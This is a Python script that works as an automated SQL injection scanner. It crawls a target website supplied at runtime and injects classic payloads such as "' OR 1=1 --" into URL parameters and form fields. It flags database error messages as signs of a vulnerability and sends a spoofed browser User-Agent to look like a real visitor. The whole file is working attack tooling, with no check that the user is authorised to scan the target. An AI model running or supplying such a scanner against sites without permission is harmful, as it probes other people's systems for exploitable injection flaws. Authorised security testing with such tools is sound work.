import requests
from urllib.parse import urljoin, urlparse
from bs4 import BeautifulSoup

# SQL Injection test payloads
sql_payloads = [
    "'", "\"", "' OR 1=1 --", "\" OR 1=1 --",
    "' OR 'a'='a", "\" OR \"a\"=\"a", "' OR '1'='1' --"
]

# Headers to simulate a real user
headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"
}

def get_urls(target_url):
    """Crawl the site and extract URLs with parameters"""
    visited_urls = set()
    urls_to_check = [target_url]

    while urls_to_check:
        url = urls_to_check.pop()
        if url in visited_urls:
            continue
        
        visited_urls.add(url)
        try:
            response = requests.get(url, headers=headers, timeout=5)
            soup = BeautifulSoup(response.text, "html.parser")
            
            # Find all anchor links
            for link in soup.find_all("a", href=True):
                new_url = urljoin(target_url, link["href"])
                if target_url in new_url and new_url not in visited_urls and "=" in new_url:
                    urls_to_check.append(new_url)
        
        except requests.exceptions.RequestException:
            continue
    
    return visited_urls

def test_sqli(url):
    """Test GET parameters for SQL Injection vulnerability"""
    parsed_url = urlparse(url)
    if not parsed_url.query:
        return
    
    base_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}"
    params = parsed_url.query.split("&")

    for param in params:
        key = param.split("=")[0]
        for payload in sql_payloads:
            test_url = f"{base_url}?{key}={payload}"
            print(f"[*] Testing {test_url}")
            try:
                response = requests.get(test_url, headers=headers, timeout=5)
                if any(error in response.text for error in [
                    "SQL syntax", "mysql_fetch", "mysqli_fetch", "You have an error in your SQL syntax",
                    "Warning: mysql_", "Unclosed quotation mark", "Microsoft OLE DB"
                ]):
                    print(f"[!!!] Possible SQLi Vulnerability: {test_url}")
                    return True
            except requests.exceptions.RequestException:
                continue

    return False

def test_forms(url):
    """Test forms on the page for SQL Injection vulnerability"""
    try:
        response = requests.get(url, headers=headers, timeout=5)
        soup = BeautifulSoup(response.text, "html.parser")
        forms = soup.find_all("form")
        
        for form in forms:
            action = form.attrs.get("action")
            full_url = urljoin(url, action)
            inputs = form.find_all("input")

            for payload in sql_payloads:
                data = {}
                for input_tag in inputs:
                    name = input_tag.attrs.get("name")
                    if name:
                        data[name] = payload  # Inject payload in input fields
                
                response = requests.post(full_url, data=data, headers=headers, timeout=5)
                if any(error in response.text for error in [
                    "SQL syntax", "mysql_fetch", "mysqli_fetch", "You have an error in your SQL syntax",
                    "Warning: mysql_", "Unclosed quotation mark", "Microsoft OLE DB"
                ]):
                    print(f"[!!!] Possible SQLi Vulnerability in Form: {full_url}")
                    return True
    
    except requests.exceptions.RequestException:
        pass

    return False

# Fix the incorrect 'if' statement
if __name__ == "__main__":
    target_site = input("Enter the target website (e.g., https://example.com): ").strip()

    print("\n[+] Crawling site for URLs...")
    urls = get_urls(target_site)
    print(f"[+] Found {len(urls)} URLs to test.")

    for url in urls:
        print(f"\n[*] Testing: {url}")
        test_sqli(url)
        test_forms(url)

    print("\n[+] Scan completed.")
